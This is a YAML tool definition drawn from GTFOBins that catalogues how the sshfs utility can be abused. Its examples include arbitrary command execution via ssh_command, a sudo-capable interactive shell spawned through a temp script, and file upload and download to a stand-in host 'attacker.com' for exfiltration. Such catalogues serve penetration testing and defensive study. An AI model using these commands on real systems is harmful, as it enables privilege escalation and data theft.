---
id: network-ssh-sshfs
namespace: network:ssh:sshfs
name: sshfs
description: "Mount remote filesystems over SSH; can read, write, and manage remote files."
author: GTFOBins
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.download
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- sshfs
parameters: []
features: []
execution:
  template: sshfs
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute arbitrary commands (sudo, unprivileged)
  command: 'sshfs -o ssh_command=/path/to/command x: /path/to/dir/'
- description: Download files (unprivileged)
  command: 'sshfs user@attacker.com:/ /path/to/dir/

    cp /path/to/dir/path/to/input-file /path/to/output-file'
- description: Spawn an interactive shell (sudo, unprivileged)
  command: 'echo -e ''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'' >/path/to/temp-file

    chmod +x /path/to/temp-file

    sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/'
- description: Upload files (unprivileged)
  command: 'sshfs user@attacker.com:/ /path/to/dir/

    cp /path/to/input-file /path/to/dir/'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/sshfs/
techniques:
- execution
- collection
- privilege-escalation
- exfiltration
install:
- method: apt
  package_name: sshfs
  commands:
  - apt-get install -y sshfs
---


# sshfs

sshfs is a command-line utility. Mount remote filesystem over SSH; can also execute arbitrary commands, download files, spawn an interactive shell, upload files.
